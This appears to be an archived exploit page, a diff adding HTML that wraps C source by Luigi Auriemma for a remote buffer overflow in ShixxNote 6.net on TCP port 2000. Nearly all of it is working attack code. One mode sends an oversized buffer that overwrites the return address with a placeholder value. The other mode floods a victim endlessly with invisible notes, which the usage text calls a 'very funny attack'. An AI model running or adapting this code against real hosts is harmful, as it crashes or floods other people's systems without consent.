@@ -1,0 +1,171 @@
+<html>
+<head>
+<title>ShixxNote 6.net Remote Buffer-Overflow</title>
+<pre>
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#ifdef WIN32
+    #include &lt;winsock.h&gt;
+    #include &quot;winerr.h&quot;
+
+    #define close   closesocket
+#else
+    #include &lt;unistd.h&gt;
+    #include &lt;sys/socket.h&gt;
+    #include &lt;sys/types.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;netdb.h&gt;
+    #include &lt;netinet/in.h&gt;
+#endif
+
+
+
+#define VER     &quot;0.1&quot;
+#define PORT    2000
+#define EIP     &quot;\xde\xc0\xad\xde&quot;  /* return address = 0xdeadc0de */
+#define BOF     &quot;attacker&quot; \
+                &quot;~~&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; EIP &quot;aaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa~~~~~~~~~~~~~~~~~~~~&quot;
+#define FLOOD   &quot;~~~~~~~~~~~~~~~~~~~~~~&quot;
+
+
+
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    int     sd;
+    u_short port = PORT;
+    struct  sockaddr_in peer;
+
+
+    setbuf(stdout, NULL);
+
+    fputs(&quot;\n&quot;
+        &quot;ShixxNote 6.net buffer overflow &quot;VER&quot;\n&quot;
+        &quot;by Luigi Auriemma\n&quot;
+        &quot;e-mail: aluigi@altervista.org\n&quot;
+        &quot;web:    http://aluigi.altervista.org\n&quot;
+        &quot;\n&quot;, stdout);
+
+    if(argc &lt; 3) {
+        printf(&quot;\nUsage: %s &lt;attack&gt; &lt;server&gt; [port(%d)]\n&quot;
+            &quot;\n&quot;
+            &quot;Attack:\n&quot;
+            &quot;1 = buffer-overflow, the return address will be overwritten with 0xdeadc0de\n&quot;
+            &quot;2 = silent flood, the remote host will be flooded by tons of invisible notes\n&quot;
+            &quot;    (very funny attack, moreover if the victim has sounds enabled)\n&quot;
+            &quot;\n&quot;, argv[0], PORT);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
+#endif
+
+    if(argc &gt; 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf(&quot;- target   %s:%hu\n&quot;,
+        inet_ntoa(peer.sin_addr), port);
+
+    if(argv[1][0] == '2') {
+        for(;;) {
+            sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if(sd &lt; 0) std_err();
+            if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
+              &lt; 0) std_err();
+            if(send(sd, FLOOD, sizeof(FLOOD) - 1, 0)
+              &lt; 0) std_err();
+            close(sd);
+            fputc('.', stdout);
+        }
+    } else {
+        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(sd &lt; 0) std_err();
+        fputs(&quot;- connection\n&quot;, stdout);
+        if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
+          &lt; 0) std_err();
+        fputs(&quot;- send buffer-overflow data\n&quot;, stdout);
+        if(send(sd, BOF, sizeof(BOF) - 1, 0)
+          &lt; 0) std_err();
+        close(sd);
+    }
+
+    printf(&quot;- the return address should be overwritten with 0x%08lx\n\n&quot;,
+        *(u_long *)EIP);
+
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
+            exit(1);
+        } else host_ip = *(u_long *)(hp-&gt;h_addr);
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror(&quot;\nError&quot;);
+        exit(1);
+    }
+#endif
+
+
+</pre>
+//milw0rm.com
+</html>
+
